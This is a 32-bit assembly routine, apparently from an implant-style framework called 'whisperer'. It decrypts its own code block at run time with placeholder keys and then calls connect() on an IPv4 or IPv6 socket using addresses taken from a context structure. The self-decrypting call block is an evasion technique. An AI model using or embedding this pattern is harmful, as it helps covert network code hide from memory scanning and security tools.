use32
org 0



ConnectBlockCall:
        push ebp
        mov ebp, esp
        sub esp, 4 + 28

        mov ebx, 0xaaaaaaaa ;key0
        mov edx, 0xbbbbbbbb ;key1
        mov ecx, .call_end - .call_begin

        mov eax, [ebp + 8] ; eax = whisperer context
        mov eax, [eax] ; eax = whisperer framework
        mov eax, [eax + 16] ; eax = decryption function

        call eax

.call_begin:
dq 0x2222222222222222 ; delimiter, gets filled with nops at run time

        mov ebx, [ebp + 8] ; ebx = whisperer context
        mov eax, [ebx] ; eax = whisperer framework
        mov eax, [eax + 24] ; eax = connect

        mov [ebp - 4], eax ; ebp - 4 = connect


        mov cl, byte [ebx + 28] ; cl = use6
        test cl, cl
        jz .connect_four

        jmp .connect_six

;sizeof(sockaddr_in) = 16
;sizeof(sockaddr_in6) = 28


.connect_four:
        mov dx, word [ebx + 30] ; dx = port
        lea eax, [ebp - 4 - 16]  ; eax = sockaddr_in
        mov word [eax], 2 ; sin_family = AF_INET
        mov word [eax + 2], dx ; sin_port = dx

        mov edx, dword [ebx + 8] ; edx = address4
        mov dword [eax + 4], edx ; sin_addr = edx

        push 16 ; sizeof(sockaddr_in)
        push eax ; sockaddr_in
        push dword [ebx + 32] ; socket handle
        call dword [ebp - 4] ; call connect

        mov ebx, [ebp + 8] ; ebx = context
        mov dword [ebx + 848], eax ; store error code

        jmp .exit

.connect_six:
        mov dx, word [ebx + 30] ; dx = port
        lea eax, [ebp - 4 - 28]  ; eax = sockaddr_in6
        mov word [eax], 23 ; sin6_family = AF_INET6
        mov word [eax + 2], dx ; sin6_port = dx

        mov ecx, 16  ; 16 byte address
        mov edi, eax
        add edi, 8   ; dst = sin6_address
        mov esi, ebx
        add esi, 12  ; src = context.address6

        rep movsb

        push 28 ; sizeof(sockaddr_in6)
        push eax ; sockaddr_in6
        push dword [ebx + 32] ; socket handle
        call dword [ebp - 4] ; call connect

        mov ebx, [ebp + 8] ; ebx = context
        mov dword [ebx + 848], eax ; store error code

        db 2 dup (0x90)

.exit:
        mov esp, ebp
        pop ebp
        ret 4

.call_end: